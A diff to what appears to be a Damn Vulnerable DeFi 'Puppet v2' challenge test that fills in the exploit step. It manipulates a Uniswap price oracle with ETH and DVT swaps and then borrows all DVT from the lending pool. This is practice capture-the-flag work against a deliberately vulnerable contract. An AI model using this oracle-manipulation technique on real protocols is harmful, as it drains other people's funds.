@@ -66,7 +66,34 @@ describe("[Challenge] Puppet v2", function () {
   });
 
   it("Exploit", async function () {
-    /** CODE YOUR EXPLOIT HERE */
+    // we need to first convert all the existing ETH to WETH
+    // then empty WETH in the pool for DVT
+    // the DVT price will be lowered in this case,
+    // so, we'll use the available WETH amount to borrow all the DVT from the pool
+    const attackerETH = await ethers.provider.getBalance(attacker.address);
+    await this.uniswapRouter.connect(attacker).swapExactETHForTokens(
+      // couldn't get all amount b/c of rapid slippage increase
+      0,
+      [this.weth.address, this.token.address],
+      attacker.address,
+      (await ethers.provider.getBlock("latest")).timestamp + 60,
+      { value: attackerETH.sub(ethers.utils.parseEther("0.05")), gasLimit: 1e6 }
+    );
+
+    const attackerDVT = await this.token.balanceOf(attacker.address);
+    await this.token.connect(attacker).approve(this.uniswapRouter.address, attackerDVT);
+    await this.uniswapRouter.connect(attacker).swapTokensForExactTokens(
+      // couldn't get all amount b/c of rapid slippage increase
+      ethers.utils.parseEther("29.8501"),
+      attackerDVT,
+      [this.token.address, this.weth.address],
+      attacker.address,
+      (await ethers.provider.getBlock("latest")).timestamp + 60
+    );
+
+    const attackerWETH = await this.weth.balanceOf(attacker.address);
+    await this.weth.connect(attacker).approve(this.lendingPool.address, attackerWETH);
+    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
   });
 
   after(async function () {
